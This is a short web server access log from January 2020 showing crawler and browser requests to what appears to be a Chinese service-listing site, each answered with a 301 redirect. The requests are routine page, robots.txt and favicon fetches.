106.11.155.148 - - [15/Jan/2020:12:28:43 +0800] "GET / HTTP/1.1" 301 178 "-" "YisouSpider"
49.7.20.144 - - [15/Jan/2020:12:28:51 +0800] "GET /shop/changeLabelDetail?mill=1472819949374&labelId=4 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
46.229.168.136 - - [15/Jan/2020:12:30:06 +0800] "GET /homepage/ser/112799 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
36.101.240.232 - - [15/Jan/2020:12:31:23 +0800] "GET / HTTP/1.1" 301 178 "https://m.baidu.com/" "Mozilla/5.0 (Linux; Android 8.0.0; PIC-AL00 Build/HUAWEIPIC-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.83 Mobile Safari/537.36 T7/11.16 SP-engine/2.12.0 baiduboxapp/11.16.2.10 (Baidu; P1 8.0.0)"
27.156.43.65 - - [15/Jan/2020:12:34:53 +0800] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
46.229.168.140 - - [15/Jan/2020:12:35:25 +0800] "GET /shop/changeLabelDetail?labelId=1&mill=1507851659546 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
49.7.20.144 - - [15/Jan/2020:12:36:41 +0800] "GET /service/market?_class=%E7%AE%A1%E7%90%86%E5%9F%B9%E8%AE%AD HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:36:53 +0800] "GET /fuwu_ggcb_pb HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:37:08 +0800] "GET /fuwu_shyl_qt HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:37:22 +0800] "GET /fw_1763 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:37:36 +0800] "GET /xq_3803 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
221.226.113.234 - - [15/Jan/2020:12:38:38 +0800] "GET /favicon.ico HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
49.7.20.144 - - [15/Jan/2020:12:39:08 +0800] "GET /xq_3963 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
125.40.41.185 - - [15/Jan/2020:12:41:57 +0800] "GET /favicon.ico HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0"
36.102.239.48 - - [15/Jan/2020:12:42:30 +0800] "GET /robots.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 ()"
36.102.239.48 - - [15/Jan/2020:12:42:31 +0800] "HEAD / HTTP/1.1" 301 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/10.04 Chromium/15.0.874.106 Chrome/15.0.874.106 Safari/535.2"
36.102.239.48 - - [15/Jan/2020:12:42:31 +0800] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/10.04 Chromium/15.0.874.106 Chrome/15.0.874.106 Safari/535.2"
114.221.133.113 - - [15/Jan/2020:12:43:22 +0800] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362"
3.19.120.216 - - [15/Jan/2020:12:44:56 +0800] "GET / HTTP/1.1" 301 178 "-" "-"
49.7.20.144 - - [15/Jan/2020:12:45:06 +0800] "GET /fuwu_rjkf_wzkf HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
36.110.199.49 - - [15/Jan/2020:12:48:17 +0800] "GET /xq_12890 HTTP/1.1" 301 178 "http://www.baidu.com/s?wd=steadyacl" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
66.249.71.105 - - [15/Jan/2020:12:50:02 +0800] "GET /fw_5129 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
